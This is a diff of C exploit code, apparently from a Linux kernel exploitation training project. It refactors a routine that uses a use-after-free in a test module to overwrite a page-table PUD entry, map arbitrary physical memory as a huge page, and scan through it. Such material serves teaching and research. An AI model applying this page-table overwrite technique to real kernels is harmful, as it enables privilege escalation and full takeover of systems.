@@ -202,28 +202,25 @@ int flush_tlb(void *addr, size_t len)
 /*
  * Overwrite one entry in PUD, which reclaimed the UAF memory.
  * This entry will point to a GiB huge page.
+ * Then perform a massive TLB flush.
  */
-int uaf_write(unsigned long phys_addr, long uaf_n, int act_fd)
+int pud_write(unsigned long pud_entry_val, long uaf_n, int act_fd)
 {
 	char act_args[DRILL_ACT_SIZE] = { 0 };
 	int ret = EXIT_FAILURE;
 
-	/* DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16 */
-	snprintf(act_args, sizeof(act_args), "0x%lx 0", phys_addr);
-	printf("[!] writing phys addreses to the PUD: %lx - %lx\n", phys_addr - PT_BITS,
-	       phys_addr - PT_BITS + PUD_SIZE);
+	printf("[!] writing 0x%lx to PUD (will point to phys addr range 0x%lx-0x%lx)\n",
+	       pud_entry_val, pud_entry_val - PT_BITS, pud_entry_val + PUD_SIZE - PT_BITS);
 
+	/* DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16 */
+	snprintf(act_args, sizeof(act_args), "0x%lx 0", pud_entry_val);
 	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, act_args);
 	if (ret == EXIT_FAILURE)
 		return EXIT_FAILURE;
-
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
 	ret = flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PT_ENTRIES * PUD_SIZE);
-	if (ret == EXIT_FAILURE)
-		return EXIT_FAILURE;
-
-	return EXIT_SUCCESS;
+	return ret;
 }
 
 /* From include/linux/kmod.h */
@@ -544,7 +541,7 @@ int main(void)
 
 	/* choose "0x0 + flags" as starting adress */
 	phys_addr = PT_BITS;
-	ret = uaf_write(phys_addr, uaf_n, act_fd);
+	ret = pud_write(phys_addr, uaf_n, act_fd);
 	if (ret == EXIT_FAILURE)
 		goto end;
 
@@ -573,7 +570,7 @@ int main(void)
 				break;
 
 			phys_addr += PUD_SIZE;
-			ret = uaf_write(phys_addr, uaf_n, act_fd);
+			ret = pud_write(phys_addr, uaf_n, act_fd);
 			if (ret == EXIT_FAILURE)
 				goto end;
 		}
